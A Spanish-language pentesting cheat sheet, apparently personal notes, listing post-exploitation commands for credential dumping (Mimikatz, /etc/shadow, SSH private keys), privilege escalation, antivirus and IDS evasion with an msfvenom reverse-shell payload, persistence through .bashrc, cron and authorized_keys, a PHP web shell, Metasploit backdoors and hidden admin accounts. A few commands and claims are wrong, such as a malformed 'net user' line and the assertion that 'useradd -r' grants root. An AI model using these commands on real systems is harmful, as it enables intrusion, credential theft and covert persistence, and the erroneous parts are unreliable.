@@ -1,0 +1,318 @@
+Extracción de Hashes de Contraseñas en Windows:
+
+    Los hashes se almacenan en el archivo SAM, y su extracción requiere acceso a los archivos SAM y SYSTEM.
+    Metasploit: post/windows/gather/hashdump extrae los hashes de contraseñas de todos los usuarios.
+    Mimikatz: Herramienta para extraer hashes, contraseñas en texto claro y tokens Kerberos. El comando sekurlsa::logonpasswords muestra todas las credenciales almacenadas.
+----------------------------------------------------------------------------------------------------------------------------------------
+Extracción de Hashes de Contraseñas en Linux:
+
+    En Linux, los hashes están en /etc/shadow y solo pueden acceder a él los usuarios root.
+    Comando: cat /etc/shadow > shadow_copy.txt
+    John the Ripper: Se usa para descifrar los hashes con un diccionario de contraseñas: john --wordlist=/ruta/diccionario.txt shadow_copy.txt.
+----------------------------------------------------------------------------------------------------------------------------------------
+Recopilación de Tokens de Autenticación:
+
+    Kerberos en Windows: Mimikatz puede extraer tickets Kerberos con el comando sekurlsa::tickets para ataques de pass-the-ticket.
+    JWT en aplicaciones web: Los tokens JWT pueden ser interceptados si no se cifran correctamente o se almacenan en cookies.
+----------------------------------------------------------------------------------------------------------------------------------------
+Captura de Credenciales SSH y RDP:
+
+    SSH en Linux: Las claves privadas se almacenan en ~/.ssh/ y pueden ser copiadas para acceder a otros servidores: cat ~/.ssh/id_rsa > ssh_key.txt.
+    RDP en Windows: Mimikatz puede interceptar sesiones activas de RDP y extraer credenciales con sekurlsa::msv.
+----------------------------------------------------------------------------------------------------------------------------------------
+Automatización de la Recopilación:
+
+    Metasploit: Ofrece módulos para automatizar la extracción de credenciales, hashes y tokens.
+    Empire: PowerShell Empire permite la automatización de la extracción de tokens Kerberos y credenciales de usuario en sistemas Windows.
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+
+
+Escalación de Privilegios en Windows:
+
+    Vulnerabilidades del sistema operativo: Ejemplo de explotación de MS10-015 usando Metasploit para elevar privilegios.
+        Comando: [ use exploit/windows/local/ms10_015_kitrap0d ]
+    Uso de Mimikatz para escalar privilegios: Extrae tokens de autenticación para acceder como Administrador.
+        Comando: [ sekurlsa::tickets ]
+    Bypassing UAC: Evitar restricciones del UAC para ejecutar comandos con privilegios de Administrador.
+        Comando: [ use exploit/windows/local/bypassuac ]
+----------------------------------------------------------------------------------------------------------------------------------------
+Escalación de Privilegios en Linux:
+
+    Vulnerabilidades del kernel: Ejemplo con Dirty COW (CVE-2016-5195).
+        Comando: [ gcc dirtycow.c -o dirtycow ] y [ ./dirtycow ]
+    Archivos con SUID mal configurados: Explotar archivos con SUID activado para ejecutar comandos como root.
+        Comando: [ find / -perm -4000 2>/dev/null ]
+    Configuración incorrecta de sudo: Ejecutar comandos sin contraseña si sudo está mal configurado.
+        Comando: [ sudo -l ]
+----------------------------------------------------------------------------------------------------------------------------------------
+Herramientas para Escalación de Privilegios:
+
+    LinPEAS: Escanea vulnerabilidades en Linux que permiten escalación.
+        Comando: [ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh ]
+    WinPEAS: Escanea configuraciones inseguras en Windows.
+        Comando: [ Invoke-WebRequest -Uri "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat" -OutFile "winpeas.bat" ]
+----------------------------------------------------------------------------------------------------------------------------------------
+Ejemplo práctico en Linux:
+
+    Buscar archivos con SUID: Para encontrar archivos mal configurados que pueden ser explotados.
+        Comando: [ find / -perm -4000 2>/dev/null ]
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+
+Evasión de Antivirus
+
+Los antivirus son una de las primeras líneas de defensa contra malware y exploits, pero los atacantes utilizan diversas técnicas para eludir su detección:
+1.1. Ofuscación de Payloads
+
+La ofuscación consiste en modificar el código del payload para que no sea detectado por las firmas de antivirus. Esto incluye cambios en la estructura del código o el uso de técnicas de cifrado para que los antivirus no puedan reconocerlo como malicioso.
+
+    Comando en Metasploit para generar un payload ofuscado:
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP_ATACANTE> LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > payload.exe
+
+Explicación: Este comando utiliza el encoder shikata_ga_nai para cifrar el payload, lo que ayuda a evitar la detección por parte de antivirus.
+
+Comando para generar un payload ofuscado con Veil:
+
+    veil
+    use python/meterpreter/rev_tcp
+    set LHOST <IP_ATACANTE>
+    set LPORT 4444
+    generate
+
+    Explicación: Veil es una herramienta que genera payloads que son indetectables por la mayoría de los antivirus, utilizando cifrado y ofuscación.
+
+1.2. Uso de Herramientas de Evasión
+
+    Veil y Shellter son herramientas especializadas para generar payloads ofuscados que evaden la detección de antivirus.
+
+    Generación de payloads con Veil:
+
+    python veil.py
+
+    Veil genera un payload cifrado que puede ser descargado en el sistema comprometido.
+
+1.3. Polimorfismo y Metamorfismo
+
+    Polimorfismo: El código del payload cambia en cada ejecución para dificultar la detección por firmas de antivirus.
+    Metamorfismo: El código no solo cambia con cada ejecución, sino que su estructura interna se modifica también, lo que hace aún más difícil la detección.
+
+2. Evasión de Firewalls
+
+Los firewalls protegen las redes bloqueando el tráfico no autorizado. Para evadirlos, los atacantes emplean técnicas como el tunneling y el redireccionamiento de puertos.
+2.1. Tunneling con SSH
+
+Utilizar túneles SSH es una de las formas más efectivas de redirigir el tráfico a través de puertos autorizados como el puerto 443 (HTTPS), permitiendo que el tráfico malicioso pase por el firewall.
+
+    Comando para redirigir tráfico a través de un túnel SSH:
+
+    ssh -L 8080:localhost:80 usuario@servidor_comprometido
+
+    Este comando crea un túnel SSH que redirige el tráfico del puerto 8080 al puerto 80 de la máquina comprometida.
+
+2.2. Ofuscación de Tráfico
+
+Herramientas como socat y stunnel pueden usarse para cifrar el tráfico y hacerlo pasar por puertos normalmente autorizados, como el puerto 443 (HTTPS), evitando que sea detectado.
+
+    Ejemplo de configuración de socat para redirigir tráfico cifrado:
+
+    socat openssl-listen:443,cert=cert.pem,verify=0 TCP:localhost:80
+
+    Este comando crea un túnel cifrado mediante SSL/TLS para redirigir tráfico hacia un puerto no autorizado.
+
+3. Evasión de IDS (Sistemas de Detección de Intrusos)
+
+Los IDS monitorean el tráfico de red en busca de patrones sospechosos, como el comportamiento de los exploits o ataques conocidos. Para evadirlos, los atacantes utilizan técnicas como la fragmentación de paquetes y el uso de técnicas de redireccionamiento.
+3.1. Fragmentación de Paquetes
+
+La fragmentación de paquetes consiste en dividir los paquetes de datos en fragmentos más pequeños para dificultar que el IDS pueda reconstruir y analizar correctamente el tráfico malicioso.
+
+    Ejemplo de fragmentación con Fragroute:
+
+fragroute -f fragroute.conf
+
+Fragroute es una herramienta que permite modificar el tráfico en tiempo real, dividiéndolo en fragmentos para evadir la detección de un IDS.
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------------------------------------
+Persistencia en Sistemas Linux
+
+En Linux, las técnicas de persistencia pueden incluir la modificación de archivos de inicio, el uso de cron jobs o la creación de backdoors mediante el sistema SSH.
+3.1. Modificación de Archivos de Inicio
+
+Los archivos como .bashrc o .bash_profile en el directorio del usuario permiten que se ejecuten comandos automáticamente al iniciar sesión. Modificar estos archivos es una técnica común de persistencia.
+
+Ejemplo de modificación de .bashrc:
+
+echo "/ruta/a/payload" >> ~/.bashrc
+
+Explicación: Este comando agrega un payload que se ejecutará cada vez que el usuario inicie sesión en su terminal.
+3.2. Cron Jobs
+
+Los cron jobs en Linux permiten la ejecución periódica de comandos o scripts en intervalos específicos. Un atacante puede configurar un cron job para ejecutar su malware en intervalos regulares.
+
+Comando para agregar un cron job:
+
+(crontab -l ; echo "*/5 * * * * /ruta/a/payload") | crontab -
+
+Explicación: Este cron job ejecutará el payload cada 5 minutos, asegurando la persistencia continua.
+3.3. SSH Backdoor
+
+Un atacante puede comprometer el acceso SSH agregando su clave pública al archivo authorized_keys de un usuario. Esto permite al atacante volver a ingresar sin necesidad de autenticación.
+
+Agregar una clave SSH maliciosa:
+
+echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys
+
+Explicación: Este comando agrega la clave pública del atacante a la lista de claves autorizadas, permitiendo el acceso persistente.
+4. Persistencia en Aplicaciones Web
+
+Los servidores web comprometidos también pueden ser objetivos de persistencia mediante la modificación de archivos críticos o la instalación de web shells.
+4.1. Web Shells
+
+Un web shell es un script malicioso cargado en un servidor web que permite ejecutar comandos remotos en el servidor. Proporciona acceso continuo siempre que la aplicación web siga activa.
+
+Ejemplo de un web shell PHP:
+
+<?php system($_GET['cmd']); ?>
+
+Explicación: Este simple web shell permite ejecutar comandos en el servidor web a través de una URL.
+5. Uso de Herramientas para Automatizar la Persistencia
+
+Las herramientas como Metasploit y PowerShell Empire permiten automatizar la persistencia en sistemas comprometidos.
+5.1. Persistencia con Metasploit
+
+Metasploit ofrece módulos de post-explotación para configurar backdoors persistentes.
+
+Comando para establecer persistencia con Metasploit:
+
+use post/windows/manage/persistence
+set SESSION <session_id>
+set PAYLOAD windows/meterpreter/reverse_tcp
+run
+
+Explicación: Este módulo crea un backdoor que se ejecutará cada vez que el sistema se reinicie.
+6. Ejemplo Práctico de Persistencia en Windows
+
+Supongamos que has comprometido un sistema Windows y deseas establecer persistencia.
+
+Pasos para establecer persistencia:
+
+    Cargar el módulo de persistencia en Metasploit:
+
+use post/windows/manage/persistence
+
+Configurar el payload y el host de escucha:
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <ip_del_host>
+set LPORT 4444
+
+Ejecutar el módulo para crear un backdoor:
+
+    run
+
+7. Backdoors
+
+Un backdoor permite al atacante reingresar al sistema comprometido en cualquier momento sin necesidad de explotar nuevamente el sistema.
+7.1. Creación de un Backdoor con Metasploit
+
+Metasploit permite la creación de backdoors que pueden ejecutarse automáticamente al iniciar el sistema.
+
+Comando en Metasploit para crear un backdoor persistente:
+
+use exploit/windows/local/persistence
+set SESSION <session_id>
+set LHOST <ip_del_host>
+set LPORT 4444
+run
+
+Explicación: Este módulo instala un backdoor que se ejecutará cada vez que el sistema comprometido inicie.
+8. Creación de Usuarios Ocultos
+
+Los usuarios ocultos son cuentas que no aparecen en las interfaces gráficas del sistema, lo que dificulta su detección.
+8.1. Creación de un usuario oculto en Windows
+
+Comando para crear un usuario oculto:
+
+net user backdoor_password /add
+net localgroup administrators backdoor /add
+
+Explicación: Este comando crea una cuenta de usuario con permisos de administrador en el sistema comprometido.
+8.2. Creación de un usuario oculto en Linux
+
+Comando para crear un usuario oculto en Linux:
+
+sudo useradd -m -r -s /bin/bash backdoor_user
+
+Explicación: Este comando crea un usuario oculto con acceso de root que no será visible en las listas de usuarios comunes.-----
+------------------------------------
+---------------------------------
+---------------------
+
+Crear un Usuario y Configurar SSH para Persistencia en un CTF
+
+Este tutorial cubre los pasos necesarios para crear un usuario en Linux y configurarlo para que se conecte a través de SSH, lo cual es útil en la fase de persistencia durante un CTF (Capture The Flag).
+1. Crear el Usuario
+
+    Crea un nuevo usuario con el comando useradd y asigna un directorio home.
+
+    sudo useradd -m tii
+
+2. Asignar una Contraseña al Usuario
+
+    Asigna una contraseña para el nuevo usuario. Esto es necesario para la autenticación por contraseña.
+
+    sudo passwd tii
+
+    Se te pedirá que ingreses y confirmes la contraseña.
+
+3. Configurar SSH para Aceptar Conexiones por Contraseña
+
+    Abre el archivo de configuración del servidor SSH (sshd_config).
+
+sudo nano /etc/ssh/sshd_config
+
+Asegúrate de que las siguientes líneas estén configuradas correctamente:
+
+    Permitir autenticación por contraseña:
+
+PasswordAuthentication yes
+
+Permitir conexiones desde cualquier IP:
+
+ListenAddress 0.0.0.0
+
+Si no lo has hecho, también desactiva la autenticación de clave pública si no la necesitas:
+
+        PubkeyAuthentication no
+
+4. Reiniciar el Servicio SSH
+
+    Guarda y cierra el archivo de configuración. Luego reinicia el servicio SSH para aplicar los cambios:
+
+    sudo systemctl restart sshd
+
+5. Verificar que SSH Está Funcionando
+
+    Asegúrate de que el servicio SSH está corriendo y escuchando en el puerto configurado:
+
+sudo systemctl status sshd
+
+Deberías ver algo similar a:
+
+    Active: active (running)
+
+6. Conectarse al Servidor SSH
+
+    Ahora, puedes conectarte al servidor usando el siguiente comando desde una máquina remota (reemplaza <IP_del_servidor> con la IP real del servidor):
+
+ssh -p 2243 tii@<IP_del_servidor>
+
+Ingresa la contraseña que asignaste al usuario tii cuando se te solicite.
